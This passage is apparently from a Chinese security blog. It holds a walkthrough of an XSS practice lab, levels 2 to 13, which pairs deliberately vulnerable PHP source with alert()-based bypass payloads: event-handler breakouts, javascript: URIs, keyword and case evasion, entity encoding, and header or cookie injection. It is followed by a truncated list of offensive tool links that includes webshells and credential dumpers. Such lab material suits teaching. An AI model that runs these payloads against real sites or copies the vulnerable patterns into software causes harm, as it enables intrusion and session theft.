class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>闭合value</p>
<p><code>keyword=test&quot;&gt;&lt;script&gt;alert(2)&lt;/script&gt;</code></p>
<br>

<p>3.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&quot;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level3.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&#x27;&quot;</span>.htmlspecialchars(<span class="variable">$str</span>).<span class="string">&quot;&#x27;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>与上一题相比，这里使用了 <code> htmlspecialchars()</code>函数，他会把<code>&lt;</code>和<code>&gt;</code>转译为html实体</p>
<p>查看源码可以发现<code>&lt;</code>和<code>&gt;</code>都被转译掉了，所以在这里可以考虑使用on一类的事件弹xss</p>
<p><code>keyword=&#39;onclick=alert(3)//</code> 闭合前面的value 注释掉后面的单引号</p>
<br>

<p>4.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str2</span>=str_replace(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=str_replace(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level4.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str3</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>和上一个差不多，只不过是用双引号闭合</p>
<p><code>keyword=&quot;oninput=alert(4)//</code></p>
<br>

<p>5.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = strtolower(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=str_replace(<span class="string">&quot;&lt;script&quot;</span>,<span class="string">&quot;&lt;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=str_replace(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level5.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str3</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这次是把&lt;script 和 on 都给替换了，所以考虑<code>a href</code> 来触发</p>
<p><code>123&quot;&gt;&lt;a href=javascript:alert(1) &gt;XSS&lt;/a&gt;</code></p>
<br>

<p>6.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str2</span>=str_replace(<span class="string">&quot;&lt;script&quot;</span>,<span class="string">&quot;&lt;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=str_replace(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=str_replace(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=str_replace(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=str_replace(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level6.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str6</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>虽然把href给改了 但可以考虑变化大小写</p>
<p><code>123&quot;&gt;&lt;a hREf=javascript:alert(1) &gt;XSS&lt;/a&gt;</code></p>
<p>7.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str2</span>=str_replace(<span class="string">&quot;&lt;script&quot;</span>,<span class="string">&quot;&lt;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=str_replace(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=str_replace(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=str_replace(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=str_replace(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level6.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str6</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><code>123&quot;&gt;&lt;scriscriptpt&gt;alert(7)&lt;/scrscriptipt&gt;//</code></p>
<p><code>123&quot;oonnclick=alert(7) //</code></p>
<br>

<p>8.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = strtolower(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=str_replace(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=str_replace(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=str_replace(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=str_replace(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=str_replace(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="variable">$str7</span>=str_replace(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&amp;quot&#x27;</span>,<span class="variable">$str6</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level8.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.htmlspecialchars(<span class="variable">$str</span>).<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;</span>.<span class="variable">$str7</span>.<span class="string">&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>javascrip&amp;#x74;:alert(1)//</code>或者</p>
<p><code>javascr%09ipt:alert(1)</code> %09对关键字隔断 然后进行实体编码<code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;</code></p>
<br>

<br>

<p>9.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = strtolower(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=str_replace(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=str_replace(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=str_replace(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=str_replace(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=str_replace(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="variable">$str7</span>=str_replace(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&amp;quot&#x27;</span>,<span class="variable">$str6</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level9.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.htmlspecialchars(<span class="variable">$str</span>).<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="literal">false</span>===strpos(<span class="variable">$str7</span>,<span class="string">&#x27;http://&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;</span>.<span class="variable">$str7</span>.<span class="string">&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>与上一关相比多了一个url检测,如果没有带http://就会报错</p>
<p><code>javascrip&amp;#x74;:alert(1)//http://test.com//</code></p>
<p>10</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str11</span> = <span class="variable">$_GET</span>[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line"><span class="variable">$str22</span>=str_replace(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str11</span>);</span><br><span class="line"><span class="variable">$str33</span>=str_replace(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str22</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="variable">$str33</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这一题的<code>keyword</code>参数不需要管,只需要控制<code>t_sort</code> </p>
<p><code>t_sort=&quot; onclick=&#39;alert(1)&#39; type=&quot;text&quot;&gt;//</code></p>
<br>

<p>11.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str00</span> = <span class="variable">$_GET</span>[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line"><span class="variable">$str11</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>];</span><br><span class="line"><span class="variable">$str22</span>=str_replace(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str11</span>);</span><br><span class="line"><span class="variable">$str33</span>=str_replace(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str22</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.htmlspecialchars(<span class="variable">$str00</span>).<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_ref&quot;  value=&quot;&#x27;</span>.<span class="variable">$str33</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>使用burp修改referer </p>
<p><code>1&quot; type=&quot;text&quot; onclick=alert(1)//</code></p>
<p>12.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str00</span> = <span class="variable">$_GET</span>[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line"><span class="variable">$str11</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line"><span class="variable">$str22</span>=str_replace(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str11</span>);</span><br><span class="line"><span class="variable">$str33</span>=str_replace(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str22</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.htmlspecialchars(<span class="variable">$str00</span>).<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_ua&quot;  value=&quot;&#x27;</span>.<span class="variable">$str33</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>和上一关一样，只不过就改UA </p>
<p>13</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">setcookie(<span class="string">&quot;user&quot;</span>, <span class="string">&quot;call me maybe?&quot;</span>, time()+<span class="number">3600</span>);</span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str00</span> = <span class="variable">$_GET</span>[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line"><span class="variable">$str11</span>=<span class="variable">$_COOKIE</span>[<span class="string">&quot;user&quot;</span>];</span><br><span class="line"><span class="variable">$str22</span>=str_replace(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str11</span>);</span><br><span class="line"><span class="variable">$str33</span>=str_replace(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str22</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.htmlspecialchars(<span class="variable">$str00</span>).<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_cook&quot;  value=&quot;&#x27;</span>.<span class="variable">$str33</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>改cookie</p>
]]></content>
      <categories>
        <category>XSS</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>Hacker_Tools-转</title>
    <url>/posts/ec585c99/</url>
    <content><![CDATA[<h1 id="Hacker-Tools"><a href="#Hacker-Tools" class="headerlink" title="Hacker_Tools"></a>Hacker_Tools</h1><p>来源：<a href="https://github.com/deliciousYSH/Hacker_Tools">https://github.com/deliciousYSH/Hacker_Tools</a></p>
<h1 id="扫描器"><a href="#扫描器" class="headerlink" title="扫描器"></a>扫描器</h1><p>Nmap端口扫描器：<br><a href="https://github.com/nmap/nmap">https://github.com/nmap/nmap</a><br>被动式注入检测工具： <a href="https://github.com/sea-god/GourdScan">https://github.com/sea-god/GourdScan</a><br>高质量扫描Linux / FreeBSD Server中的任何漏洞：<br><a href="https://github.com/future-architect/vuls">https://github.com/future-architect/vuls</a><br>子域名扫描器：<br>Altdns-通过变更和排列发现子域：<a href="https://github.com/infosec-au/altdns">https://github.com/infosec-au/altdns</a><br>SubBrute使用开放式解析器作为一种代理来规避DNS速率限制：<a href="https://github.com/TheRook/subbrute">https://github.com/TheRook/subbrute</a><br>subDomainsBrute 1.2一个针对渗透测试者的快速子域暴力工具：<a href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a><br>Sublist3r:<a href="https://github.com/aboul3la/Sublist3r">https://github.com/aboul3la/Sublist3r</a><br>本地网络扫描器（打开网页时扫描本地网络的PoC Javascript）：<br><a href="https://github.com/SkyLined/LocalNetworkScanner">https://github.com/SkyLined/LocalNetworkScanner</a><br>HellRaiser基于端口扫描以及关联CVE:<br><a href="https://github.com/m0nad/HellRaiser">https://github.com/m0nad/HellRaiser</a><br>Routeh-页面上的漏洞路由器：<br><a href="https://github.com/jh00nbr/Routeh">https://github.com/jh00nbr/Routeh</a><br>防火墙检测工具：<br><a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a><br>漏洞扫描程序，以最少的规则集在短时间内扫描大量目标：<br><a href="https://github.com/lijiejie/BBScan">https://github.com/lijiejie/BBScan</a><br>基于SQLMAP的主动和被动SQL注入的漏洞扫描工具： <a href="https://github.com/fengxuangit/Fox-scan/">https://github.com/fengxuangit/Fox-scan/</a></p>
<h1 id="信息搜集工具"><a href="#信息搜集工具" class="headerlink" title="信息搜集工具"></a>信息搜集工具</h1><p>社工收集工具：<br><a href="https://github.com/n0tr00t/Sreg">https://github.com/n0tr00t/Sreg</a><br>信息扫描工具：<br><a href="https://github.com/darryllane/Bluto">https://github.com/darryllane/Bluto</a><br>本地网络扫描仪：<br><a href="https://github.com/sowish/LNScan">https://github.com/sowish/LNScan</a><br>通过RDP扫描可访问性工具后门：<br><a href="https://github.com/linuz/Sticky-Keys-Slayer">https://github.com/linuz/Sticky-Keys-Slayer</a><br>网络基础设施渗透测试工具：<br><a href="https://github.com/SECFORCE/sparta">https://github.com/SECFORCE/sparta</a><br>GitHub信息收集：<br><a href="https://github.com/metac0rtex/GitHarvester">https://github.com/metac0rtex/GitHarvester</a></p>
<h1 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h1><p>密码破解工具（开膛手Johnny）:<br><a href="https://github.com/shinnok/johnny">https://github.com/shinnok/johnny</a><br>获取存储在本地计算机上大量的密码：<br><a href="https://github.com/AlessandroZ/LaZagne">https://github.com/AlessandroZ/LaZagne</a><br>SNMP暴力破解：<br><a href="https://github.com/SECFORCE/SNMP-Brute">https://github.com/SECFORCE/SNMP-Brute</a></p>
<h1 id="Web渗透（禁止用作违法）"><a href="#Web渗透（禁止用作违法）" class="headerlink" title="Web渗透（禁止用作违法）"></a>Web渗透（禁止用作违法）</h1><p>HTTP暴力破解，撞库攻击脚本：<br><a href="https://github.com/lijiejie/htpwdScan">https://github.com/lijiejie/htpwdScan</a><br>webshell：<br><a href="https://github.com/tennc/webshell">https://github.com/tennc/webshell</a><br>免杀webshell无限生成工具：<br><a href="https://github.com/yzddmr6/webshell-venom">https://github.com/yzddmr6/webshell-venom</a><br>渗透工具合集：<br><a href="https://github.com/rootphantomer/hack_tools_for_me">https://github.com/rootphantomer/hack_tools_for_me</a><br>XSSOR-方便XSS与CSRF的工具：<br><a href="https://github.com/evilcos/xssor2">https://github.com/evilcos/xssor2</a><br>w3af-Web应用程序攻击和审核框架：<br><a href="https://github.com/andresriancho/w3af">https://github.com/andresriancho/w3af</a><br>渗透测试包：<br><a href="https://github.com/leonteale/pentestpackage">https://github.com/leonteale/pentestpackage</a><br>网络路径扫描仪：<br><a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a><br>代码注入检测工具： <a href="https://github.com/epinna/tplmap">https://github.com/epinna/tplmap</a> hackUtils：<br><a href="https://github.com/brianwrf/hackUtils">https://github.com/brianwrf/hackUtils</a><br>Nikto Web服务器扫描仪：<br><a href="https://github.com/sullo/nikto">https://github.com/sullo/nikto</a><br>自动化的多合一OS命令注入和利用工具：<br><a href="https://github.com/commixproject/commix">https://github.com/commixproject/commix</a><br>sslscan测试：<br><a href="https://github.com/rbsec/sslscan">https://github.com/rbsec/sslscan</a><br>Windows安全工具套件：<br><a href="https://github.com/codejanus/ToolSuite">https://github.com/codejanus/ToolSuite</a><br>Apache实时日志分析器系统：<br><a href="https://github.com/mthbernardes/ARTLAS">https://github.com/mthbernardes/ARTLAS</a><br>检测网络入侵的特征，恶意蜘蛛（Malspider）：<br><a href="https://github.com/ciscocsirt/malspider">https://github.com/ciscocsirt/malspider</a><br>下一代网络扫描仪WhatWeb：<br><a href="https://github.com/urbanadventurer/whatweb">https://github.com/urbanadventurer/whatweb</a><br>WPScan，WordPress漏洞扫描程序：<br><a href="https://github.com/wpscanteam/wpscan">https://github.com/wpscanteam/wpscan</a><br>【sqlmap】:<br><a 